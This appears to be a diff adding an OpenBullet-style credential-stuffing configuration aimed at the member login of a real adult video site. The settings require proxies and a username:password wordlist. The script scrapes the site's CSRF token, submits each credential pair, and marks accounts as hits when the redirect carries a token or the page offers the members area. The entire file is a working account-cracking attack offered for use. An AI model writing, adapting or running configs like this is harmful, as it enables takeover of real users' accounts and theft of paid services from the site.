@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "nubilefilms",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-12T02:34:51.2868195+00:00",
+  "AdditionalInfo": "",
+  "Author": "soot",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST1 REQUEST GET "https://nubilefilms.com/login?r=members.nubilefilms.com%2F&check=fail" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"csrf-token\" value=\"" "\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#REQUEST2 REQUEST POST "https://nubilefilms.com/authentication/login" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&site_select=4&r=members.nubilefilms.com%2F&csrf-token=<CSRF>&sign-in=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://nubilefilms.com/login?r=members.nubilefilms.com%2F&check=fail" 
+PARSE "<HEADERS(Location)>" LR "" "" Recursive=FALSE -> VAR "REDIR" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<REDIR>" DoesNotContain "token" 
+  KEYCHAIN Success OR 
+    KEY "<REDIR>" Contains "token" 
+#REQUEST3 REQUEST GET "https:<REDIR>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://nubilefilms.com/login?r=members.nubilefilms.com%2F&check=fail" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Continue to Members Area" 
